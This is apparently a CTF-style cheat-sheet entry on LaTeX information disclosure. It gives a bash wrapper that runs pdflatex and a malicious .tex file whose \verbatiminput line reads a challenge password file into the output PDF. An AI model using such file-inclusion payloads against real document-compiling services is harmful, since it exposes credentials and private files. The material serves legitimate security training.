
In computing, **LaTeX** is a typesetting system commonly **used for creating documents that require precise formatting**, such as academic papers, technical reports, presentations, and scientific articles. LaTeX is widely used in academia, especially in fields such as mathematics, computer science, engineering, physics, and other technical disciplines.


## Input

Latex `input` statement in vulnerable to information disclosure.  
It allows to include file content into PDFs for example

***PDF Maker (Latex compiler)***
```bash
#!/usr/bin/env bash                                                    

if [[ $# -ne 1 ]]; then                                                
    echo "Usage : ${0} TEX_FILE"                                       
fi                                                                     

if [[ -f "${1}" ]]; then                                               
    TMP=$(mktemp -d)                                                   
    cp "${1}" "${TMP}/main.tex"                                        

    # Compilation                                                      
    echo "[+] Compilation ..."                                         
    timeout 5 /usr/bin/pdflatex \                                      
        -halt-on-error \                                               
        -output-format=pdf \                                           
        -output-directory "${TMP}" \                                   
        -no-shell-escape \                                             
        "${TMP}/main.tex" > /dev/null                                  

    timeout 5 /usr/bin/pdflatex \                                      
        -halt-on-error \                                               
        -output-format=pdf \                                           
        -output-directory "${TMP}" \                                   
        -no-shell-escape \                                             
        "${TMP}/main.tex" > /dev/null                                  

    chmod u+w "${TMP}/main.tex"                                        
    rm "${TMP}/main.tex"                                               
    chmod 750 -R "${TMP}"                                              
    if [[ -f "${TMP}/main.pdf" ]]; then                                
        echo "[+] Output file : ${TMP}/main.pdf"                       
    else                                                               
        echo "[!] Compilation error, your logs : ${TMP}/main.log"      
    fi                                                                 
else                                                                   
    echo "[!] Can't access file ${1}"                                  
fi                                                                     
```

**Usage :**
```bash
./compiler LATEXFILE.tex
```

The fact is that if the compiler runs with privileges, it can read files content (if the owner have read rights)

**Malicious file :**
```latex
\documentclass{article}

\usepackage{verbatim} % Pour utiliser \verbatiminput

\title{Inclusion du fichier .passwd dans LaTeX}
\author{}
\date{}

\begin{document}

\maketitle

Voici le contenu du fichier \texttt{.passwd} :

\verbatiminput{/challenge/app-script/ch23/.passwd}

\end{document}
```